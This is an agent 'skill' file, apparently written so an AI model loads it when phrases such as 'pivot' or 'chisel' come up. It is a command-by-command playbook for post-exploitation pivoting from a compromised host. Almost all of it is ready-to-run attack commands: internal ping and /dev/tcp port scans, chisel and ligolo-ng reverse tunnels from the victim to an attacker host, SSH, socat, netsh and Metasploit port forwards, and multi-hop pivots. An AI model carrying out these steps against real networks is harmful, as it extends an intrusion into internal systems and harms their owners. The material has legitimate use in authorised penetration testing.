# SKILL: Network Pivoting & Tunneling

## Description
Post-exploitation pivoting and tunneling techniques for accessing internal networks.

## Trigger Phrases
pivot, tunnel, port forward, chisel, ligolo, socks, proxychains, internal network

## Methodology

### Phase 1: Network Discovery
1. Internal scan from compromised host: `ip addr`, `arp -a`, `cat /etc/hosts`
2. Ping sweep: `for i in $(seq 1 254); do ping -c 1 10.10.10.$i; done`
3. Port scan internal: `for port in 21 22 80 443 445 3389; do echo >/dev/tcp/10.10.10.X/$port && echo "$port open"; done 2>/dev/null`

### Phase 2: Tunneling Tools
1. **Chisel** (recommended):
   - Server (attacker): `chisel server --reverse -p 8080`
   - Client (victim): `chisel client <attacker>:8080 R:socks`
   - Use: `proxychains nmap -sT 10.10.10.0/24`
2. **Ligolo-ng**:
   - Proxy (attacker): `ligolo-proxy -selfcert`
   - Agent (victim): `ligolo-agent -connect <attacker>:11601`
3. **SSH tunneling**:
   - Local: `ssh -L 8080:internal:80 user@pivot`
   - Dynamic SOCKS: `ssh -D 1080 user@pivot`
   - Remote: `ssh -R 9090:localhost:80 user@pivot`

### Phase 3: Port Forwarding
1. `socat TCP-LISTEN:8080,fork TCP:internal:80`
2. `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.10.10.X connectport=80` (Windows)
3. Metasploit: `portfwd add -l 8080 -p 80 -r 10.10.10.X`

### Phase 4: Double Pivot
1. Chain proxies: proxychains through multiple SOCKS
2. Multi-hop SSH: `ssh -J user@pivot1 user@pivot2`
3. Route through ligolo-ng interfaces
